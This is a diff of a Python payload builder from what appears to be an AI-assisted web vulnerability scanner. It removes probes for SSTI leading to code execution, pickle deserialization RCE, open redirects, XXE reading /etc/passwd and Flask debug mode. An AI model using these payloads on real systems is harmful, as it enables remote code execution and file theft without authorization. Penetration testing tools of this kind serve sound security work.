@@ -113,41 +113,6 @@ class PayloadBuilder:
             Payload("shell.php", param_name="filename", expected_result="文件上传成功",
                     risk_level="medium", description="PHP 文件上传探测"),
         ],
-        "ssti": [
-            Payload("{{7*7}}", param_name="template", expected_result="页面渲染出 49",
-                    risk_level="safe", description="Jinja2 模板注入基础探测"),
-            Payload("{{config}}", param_name="template", expected_result="泄露 Flask 配置",
-                    risk_level="medium", description="Flask 配置泄露（确认 SSTI）"),
-            Payload("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-                    param_name="template", expected_result="返回 uid/gid",
-                    risk_level="dangerous", description="SSTI → RCE 利用链"),
-        ],
-        "insecure_deserialization": [
-            Payload("cos\\nsystem\\n(S'id'\\ntR.", param_name="data",
-                    expected_result="执行 id 命令", risk_level="dangerous",
-                    description="pickle 反序列化 RCE（Python2 风格）"),
-            Payload("c__builtin__\\neval\\n(S'__import__(\"os\").system(\"id\")'\\ntR.",
-                    param_name="data", expected_result="执行 id 命令",
-                    risk_level="dangerous", description="pickle eval 链 RCE"),
-        ],
-        "open_redirect": [
-            Payload("https://evil.example.com", param_name="next",
-                    expected_result="跳转到外部域名", risk_level="safe",
-                    description="外部域名跳转探测"),
-            Payload("//evil.example.com", param_name="next",
-                    expected_result="协议相对跳转绕过", risk_level="medium",
-                    description="协议相对 URL 绕过前缀校验"),
-        ],
-        "xxe": [
-            Payload("<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>",
-                    param_name="xml", expected_result="返回 passwd 内容",
-                    risk_level="medium", description="XXE 文件读取（经典实体注入）"),
-        ],
-        "debug_mode": [
-            Payload("GET /（访问任意端点并触发异常）", param_name="-",
-                    expected_result="返回 Werkzeug Debugger 页面或堆栈信息",
-                    risk_level="safe", description="调试模式确认：观察调试器/堆栈泄露"),
-        ],
     }
 
     def __init__(self, ai_client):
